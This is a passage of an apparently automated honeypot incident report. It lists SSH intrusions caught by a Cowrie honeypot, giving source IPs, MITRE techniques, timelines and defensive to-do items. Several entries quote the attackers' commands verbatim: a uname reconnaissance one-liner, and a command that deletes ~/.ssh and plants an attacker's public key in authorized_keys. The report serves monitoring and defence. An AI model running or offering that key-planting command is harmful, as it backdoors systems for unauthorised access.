| `2026-07-06 16:04:56` | `cowrie.login.success` |
| `2026-07-06 16:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.45[.]134` to AbuseIPDB if not already reported
- [ ] Block `118.193.45[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12e5147743a2

| Field | Detail |
|---|---|
| **Source IP** | `118.193.45[.]134` |
| **First Seen** | 2026-07-06 16:04 |
| **Last Seen** | 2026-07-06 16:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:04:56` | `cowrie.session.connect` |
| `2026-07-06 16:04:56` | `cowrie.client.version` |
| `2026-07-06 16:04:57` | `cowrie.client.kex` |
| `2026-07-06 16:04:57` | `cowrie.login.success` |
| `2026-07-06 16:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.45[.]134` to AbuseIPDB if not already reported
- [ ] Block `118.193.45[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5d49d655dfe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:05 |
| **Last Seen** | 2026-07-06 16:05 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:05:25` | `cowrie.session.connect` |
| `2026-07-06 16:05:26` | `cowrie.client.version` |
| `2026-07-06 16:05:26` | `cowrie.client.kex` |
| `2026-07-06 16:05:34` | `cowrie.login.success` |
| `2026-07-06 16:05:39` | `cowrie.session.params` |
| `2026-07-06 16:05:39` | `cowrie.command.input` |
| `2026-07-06 16:05:39` | `cowrie.command.input` |
| `2026-07-06 16:05:39` | `cowrie.command.input` |
| `2026-07-06 16:05:39` | `cowrie.command.input` |
| `2026-07-06 16:05:39` | `cowrie.command.input` |
| `2026-07-06 16:05:39` | `cowrie.command.success` |
| `2026-07-06 16:05:39` | `cowrie.command.input` |
| `2026-07-06 16:05:39` | `cowrie.command.input` |
| `2026-07-06 16:05:39` | `cowrie.command.input` |
| `2026-07-06 16:05:39` | `cowrie.command.input` |
| `2026-07-06 16:05:41` | `cowrie.log.closed` |
| `2026-07-06 16:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4017f32b95c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:06 |
| **Last Seen** | 2026-07-06 16:06 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:06:30` | `cowrie.session.connect` |
| `2026-07-06 16:06:33` | `cowrie.client.version` |
| `2026-07-06 16:06:33` | `cowrie.client.kex` |
| `2026-07-06 16:06:44` | `cowrie.login.success` |
| `2026-07-06 16:06:47` | `cowrie.session.params` |
| `2026-07-06 16:06:47` | `cowrie.command.input` |
| `2026-07-06 16:06:47` | `cowrie.command.input` |
| `2026-07-06 16:06:47` | `cowrie.command.input` |
| `2026-07-06 16:06:47` | `cowrie.command.input` |
| `2026-07-06 16:06:47` | `cowrie.command.input` |
| `2026-07-06 16:06:47` | `cowrie.command.success` |
| `2026-07-06 16:06:47` | `cowrie.command.input` |
| `2026-07-06 16:06:47` | `cowrie.command.input` |
| `2026-07-06 16:06:47` | `cowrie.command.input` |
| `2026-07-06 16:06:47` | `cowrie.command.input` |
| `2026-07-06 16:06:50` | `cowrie.log.closed` |
| `2026-07-06 16:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b99f61763e1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:07 |
| **Last Seen** | 2026-07-06 16:08 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:07:44` | `cowrie.session.connect` |
| `2026-07-06 16:07:45` | `cowrie.client.version` |
| `2026-07-06 16:07:45` | `cowrie.client.kex` |
| `2026-07-06 16:07:52` | `cowrie.login.success` |
| `2026-07-06 16:07:58` | `cowrie.session.params` |
| `2026-07-06 16:07:58` | `cowrie.command.input` |
| `2026-07-06 16:07:58` | `cowrie.command.input` |
| `2026-07-06 16:07:58` | `cowrie.command.input` |
| `2026-07-06 16:07:58` | `cowrie.command.input` |
| `2026-07-06 16:07:58` | `cowrie.command.input` |
| `2026-07-06 16:07:58` | `cowrie.command.success` |
| `2026-07-06 16:07:58` | `cowrie.command.input` |
| `2026-07-06 16:07:58` | `cowrie.command.input` |
| `2026-07-06 16:07:58` | `cowrie.command.input` |
| `2026-07-06 16:07:58` | `cowrie.command.input` |
| `2026-07-06 16:08:00` | `cowrie.log.closed` |
| `2026-07-06 16:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca03a5793c70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:08 |
| **Last Seen** | 2026-07-06 16:09 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:08:52` | `cowrie.session.connect` |
| `2026-07-06 16:08:54` | `cowrie.client.version` |
| `2026-07-06 16:08:54` | `cowrie.client.kex` |
| `2026-07-06 16:09:00` | `cowrie.login.success` |
| `2026-07-06 16:09:03` | `cowrie.session.params` |
| `2026-07-06 16:09:03` | `cowrie.command.input` |
| `2026-07-06 16:09:03` | `cowrie.command.input` |
| `2026-07-06 16:09:03` | `cowrie.command.input` |
| `2026-07-06 16:09:03` | `cowrie.command.input` |
| `2026-07-06 16:09:03` | `cowrie.command.input` |
| `2026-07-06 16:09:03` | `cowrie.command.success` |
| `2026-07-06 16:09:03` | `cowrie.command.input` |
| `2026-07-06 16:09:03` | `cowrie.command.input` |
| `2026-07-06 16:09:03` | `cowrie.command.input` |
| `2026-07-06 16:09:03` | `cowrie.command.input` |
| `2026-07-06 16:09:04` | `cowrie.log.closed` |
| `2026-07-06 16:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-925c08580ffa

| Field | Detail |
|---|---|
| **Source IP** | `118.194.228[.]101` |
| **First Seen** | 2026-07-06 16:09 |
| **Last Seen** | 2026-07-06 16:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:09:43` | `cowrie.session.connect` |
| `2026-07-06 16:09:43` | `cowrie.client.version` |
| `2026-07-06 16:09:43` | `cowrie.client.kex` |
| `2026-07-06 16:09:44` | `cowrie.login.success` |
| `2026-07-06 16:09:45` | `cowrie.session.params` |
| `2026-07-06 16:09:45` | `cowrie.command.input` |
| `2026-07-06 16:09:45` | `cowrie.command.failed` |
| `2026-07-06 16:09:45` | `cowrie.log.closed` |
| `2026-07-06 16:09:46` | `cowrie.session.params` |
| `2026-07-06 16:09:46` | `cowrie.command.input` |
| `2026-07-06 16:09:46` | `cowrie.session.file_download` |
| `2026-07-06 16:09:46` | `cowrie.log.closed` |
| `2026-07-06 16:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.228[.]101` to AbuseIPDB if not already reported
- [ ] Block `118.194.228[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62babb6b98c

| Field | Detail |
|---|---|
| **Source IP** | `118.194.228[.]101` |
| **First Seen** | 2026-07-06 16:09 |
| **Last Seen** | 2026-07-06 16:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:09:47` | `cowrie.session.connect` |
| `2026-07-06 16:09:47` | `cowrie.client.version` |
| `2026-07-06 16:09:47` | `cowrie.client.kex` |
| `2026-07-06 16:09:47` | `cowrie.login.success` |
| `2026-07-06 16:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.228[.]101` to AbuseIPDB if not already reported
- [ ] Block `118.194.228[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f34f54c4a5ae

| Field | Detail |
|---|---|
| **Source IP** | `118.194.228[.]101` |
| **First Seen** | 2026-07-06 16:09 |
| **Last Seen** | 2026-07-06 16:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:09:48` | `cowrie.session.connect` |
| `2026-07-06 16:09:48` | `cowrie.client.version` |
| `2026-07-06 16:09:48` | `cowrie.client.kex` |
| `2026-07-06 16:09:49` | `cowrie.login.success` |
| `2026-07-06 16:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.228[.]101` to AbuseIPDB if not already reported
- [ ] Block `118.194.228[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b987343682b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:09 |
| **Last Seen** | 2026-07-06 16:10 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:09:54` | `cowrie.session.connect` |
| `2026-07-06 16:09:58` | `cowrie.client.version` |
| `2026-07-06 16:09:58` | `cowrie.client.kex` |
| `2026-07-06 16:10:12` | `cowrie.login.success` |
| `2026-07-06 16:10:16` | `cowrie.session.params` |
| `2026-07-06 16:10:16` | `cowrie.command.input` |
| `2026-07-06 16:10:16` | `cowrie.command.input` |
| `2026-07-06 16:10:16` | `cowrie.command.input` |
| `2026-07-06 16:10:16` | `cowrie.command.input` |
| `2026-07-06 16:10:16` | `cowrie.command.input` |
| `2026-07-06 16:10:16` | `cowrie.command.success` |
| `2026-07-06 16:10:16` | `cowrie.command.input` |
| `2026-07-06 16:10:16` | `cowrie.command.input` |
| `2026-07-06 16:10:16` | `cowrie.command.input` |
| `2026-07-06 16:10:16` | `cowrie.command.input` |
| `2026-07-06 16:10:17` | `cowrie.log.closed` |
| `2026-07-06 16:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d248e28d070b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 16:10 |
| **Last Seen** | 2026-07-06 16:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:10:26` | `cowrie.session.connect` |
| `2026-07-06 16:10:26` | `cowrie.client.version` |
| `2026-07-06 16:10:26` | `cowrie.client.kex` |
| `2026-07-06 16:10:26` | `cowrie.login.success` |
| `2026-07-06 16:10:27` | `cowrie.session.params` |
| `2026-07-06 16:10:27` | `cowrie.command.input` |
| `2026-07-06 16:10:27` | `cowrie.log.closed` |
| `2026-07-06 16:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce30ed11a1d6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 16:10 |
| **Last Seen** | 2026-07-06 16:10 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:10:32` | `cowrie.session.connect` |
| `2026-07-06 16:10:33` | `cowrie.client.version` |
| `2026-07-06 16:10:33` | `cowrie.client.kex` |
| `2026-07-06 16:10:38` | `cowrie.login.success` |
| `2026-07-06 16:10:42` | `cowrie.session.params` |
| `2026-07-06 16:10:42` | `cowrie.command.input` |
| `2026-07-06 16:10:43` | `cowrie.log.closed` |
| `2026-07-06 16:10:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95242f97a98

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:11 |
| **Last Seen** | 2026-07-06 16:11 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:11:09` | `cowrie.session.connect` |
| `2026-07-06 16:11:10` | `cowrie.client.version` |
| `2026-07-06 16:11:10` | `cowrie.client.kex` |
| `2026-07-06 16:11:17` | `cowrie.login.success` |
| `2026-07-06 16:11:21` | `cowrie.session.params` |
| `2026-07-06 16:11:21` | `cowrie.command.input` |
| `2026-07-06 16:11:21` | `cowrie.command.input` |
| `2026-07-06 16:11:21` | `cowrie.command.input` |
| `2026-07-06 16:11:21` | `cowrie.command.input` |
| `2026-07-06 16:11:21` | `cowrie.command.input` |
| `2026-07-06 16:11:21` | `cowrie.command.success` |
| `2026-07-06 16:11:21` | `cowrie.command.input` |
| `2026-07-06 16:11:21` | `cowrie.command.input` |
| `2026-07-06 16:11:21` | `cowrie.command.input` |
| `2026-07-06 16:11:21` | `cowrie.command.input` |
| `2026-07-06 16:11:24` | `cowrie.log.closed` |
| `2026-07-06 16:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eb5c05577a9

| Field | Detail |
|---|---|
| **Source IP** | `104.218.166[.]62` |
| **First Seen** | 2026-07-06 16:11 |
| **Last Seen** | 2026-07-06 16:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:11:20` | `cowrie.session.connect` |
| `2026-07-06 16:11:20` | `cowrie.client.version` |
| `2026-07-06 16:11:20` | `cowrie.client.kex` |
| `2026-07-06 16:11:21` | `cowrie.login.success` |
| `2026-07-06 16:11:22` | `cowrie.session.params` |
| `2026-07-06 16:11:22` | `cowrie.command.input` |
| `2026-07-06 16:11:22` | `cowrie.command.failed` |
| `2026-07-06 16:11:23` | `cowrie.log.closed` |
| `2026-07-06 16:11:24` | `cowrie.session.params` |
| `2026-07-06 16:11:24` | `cowrie.command.input` |
| `2026-07-06 16:11:24` | `cowrie.session.file_download` |
| `2026-07-06 16:11:24` | `cowrie.log.closed` |
| `2026-07-06 16:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.218.166[.]62` to AbuseIPDB if not already reported
- [ ] Block `104.218.166[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b68826d7a44a

| Field | Detail |
|---|---|
| **Source IP** | `104.218.166[.]62` |
| **First Seen** | 2026-07-06 16:11 |
| **Last Seen** | 2026-07-06 16:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:11:24` | `cowrie.session.connect` |
| `2026-07-06 16:11:24` | `cowrie.client.version` |
| `2026-07-06 16:11:25` | `cowrie.client.kex` |
| `2026-07-06 16:11:26` | `cowrie.login.success` |
| `2026-07-06 16:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.218.166[.]62` to AbuseIPDB if not already reported
- [ ] Block `104.218.166[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a77c16632a0d

| Field | Detail |
|---|---|
| **Source IP** | `104.218.166[.]62` |
| **First Seen** | 2026-07-06 16:11 |
| **Last Seen** | 2026-07-06 16:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:11:26` | `cowrie.session.connect` |
| `2026-07-06 16:11:26` | `cowrie.client.version` |
| `2026-07-06 16:11:26` | `cowrie.client.kex` |
| `2026-07-06 16:11:28` | `cowrie.login.success` |
| `2026-07-06 16:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.218.166[.]62` to AbuseIPDB if not already reported
- [ ] Block `104.218.166[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5601dffb672

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:12 |
| **Last Seen** | 2026-07-06 16:12 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:12:16` | `cowrie.session.connect` |
| `2026-07-06 16:12:17` | `cowrie.client.version` |
| `2026-07-06 16:12:17` | `cowrie.client.kex` |
| `2026-07-06 16:12:27` | `cowrie.login.success` |
| `2026-07-06 16:12:30` | `cowrie.session.params` |
| `2026-07-06 16:12:30` | `cowrie.command.input` |
| `2026-07-06 16:12:30` | `cowrie.command.input` |
| `2026-07-06 16:12:30` | `cowrie.command.input` |
| `2026-07-06 16:12:30` | `cowrie.command.input` |
| `2026-07-06 16:12:30` | `cowrie.command.input` |
| `2026-07-06 16:12:30` | `cowrie.command.success` |
| `2026-07-06 16:12:30` | `cowrie.command.input` |
| `2026-07-06 16:12:30` | `cowrie.command.input` |
| `2026-07-06 16:12:30` | `cowrie.command.input` |
| `2026-07-06 16:12:30` | `cowrie.command.input` |
| `2026-07-06 16:12:32` | `cowrie.log.closed` |
| `2026-07-06 16:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-421f94876d18

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 16:13 |
| **Last Seen** | 2026-07-06 16:13 |
